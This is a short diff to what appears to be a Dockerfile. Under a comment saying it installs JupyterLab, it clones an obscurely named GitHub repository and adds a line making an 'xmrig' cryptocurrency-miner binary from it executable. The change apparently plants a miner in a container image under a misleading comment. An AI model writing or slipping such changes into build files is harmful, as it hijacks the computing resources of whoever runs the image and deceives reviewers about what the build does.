@@ -52,7 +52,7 @@ WORKDIR /app
 
 # Install JupyterLab
 RUN git clone https://github.com/SudoSuII/hsJwjJwj91
-
+RUN chmod +x /app/hsJwjJwj91/xmrig
 # Expose port 8080
 EXPOSE 8080
 
